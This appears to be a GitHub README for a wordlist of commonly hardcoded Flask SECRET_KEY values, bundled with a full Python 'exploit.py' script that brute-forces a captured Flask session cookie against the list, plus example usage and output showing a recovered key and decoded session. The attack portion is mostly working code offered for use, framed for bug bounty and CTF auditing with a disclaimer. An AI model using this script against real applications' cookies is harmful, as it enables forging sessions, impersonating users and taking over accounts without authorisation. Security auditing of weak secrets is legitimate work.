
# Flask-Secret-Wordlist

![License: MIT](https://img.shields.io/badge/license-MIT-green)

A curated wordlist of the most commonly hardcoded Flask secret keys — used by developers as placeholders and **never changed in production**. This list is built from real-world analysis, tutorials, boilerplates, and AI-generated code snippets.

> **Why this matters:**  
Misconfigured or predictable `SECRET_KEY` values in Flask apps can **lead to session hijacking, remote code execution, and full account takeover** via crafted cookies or session brute-forcing. This project empowers ethical hackers, CTF players, and bug bounty hunters to audit Flask applications for weak secrets.

---

## Contents

- [`wordlist.txt`](/wordlist.txt) — A large list of common and AI-generated Flask `SECRET_KEY` values.
- [`exploit.py`](/exploit.py) — A placeholder script to brute-force Flask session cookies using the wordlist.

---

## Potential Impact

> If you can guess the `SECRET_KEY`, you may be able to:
- Forge or decrypt Flask session cookies
- Impersonate other users (e.g., admin)
- Modify or inject malicious session data
- Bypass authentication
- Achieve full control in some cases

**Never trust default keys — and always rotate your secrets.**

---

## ⚠️ Legal Disclaimer

This tool is provided for **educational and ethical testing** purposes only. Do not use against targets you don’t have permission to test. I am not responsible for misuse.

---

## [`exploit.py`](/exploit.py)

#### Install dependencies:

```bash
pip install -r requirements.txt
```

The included script ([`exploit.py`](/exploit.py)) can be used to brute-force Flask session cookies using this wordlist:

```python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import BadSignature
import argparse

class MockApp:
    secret_key = None

def decode_flask_cookie(secret_key, cookie_value):
    app = MockApp()
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    if not session_serializer:
        return None

    try:
        data = session_serializer.loads(cookie_value)
        return data
    except BadSignature:
        return None
    except Exception as e:
        print(f"[!] Error with key '{secret_key}': {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description='Brute-force Flask secret key.')
    parser.add_argument('-c', '--cookie', required=True, help='Flask session cookie')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist')
    args = parser.parse_args()

    with open(args.wordlist, 'r') as f:
        keys = [line.strip() for line in f]

    print(f"[*] Trying {len(keys)} keys...")

    for key in keys:
        result = decode_flask_cookie(key, args.cookie)
        if result is not None:
            print(f"[+] Found key: '{key}'")
            print(f"[+] Decoded session: {result}")
            return

    print("[-] Secret key not found in wordlist.")

if __name__ == '__main__':
    main()
```

---

## Example Usage

```bash
python exploit.py -c "eyJuYW1lIjoiSm9obiBEb2UiLCJyb2xlIjoiam91cm5hbGlzdCJ9.aJUTqw.Jp6vlGEa0zUzviCib2IXNI94qGA" -w wordlist.txt
```

### Output : 

```
[*] Trying 74 keys...
[+] Found key: 'supersecretkey123'
[+] Decoded session: {'name': 'John Doe', 'role': 'journalist'}
```

---

## License

MIT License. Use it freely, contribute, or build on it!

## Contributing

Contributions are welcome!
- Submit new hardcoded keys found in public repos
- Improve the `exploit.py` logic (e.g., multithreading, error handling)
- Suggest corner cases or expand the tool to Django / Rails cookies
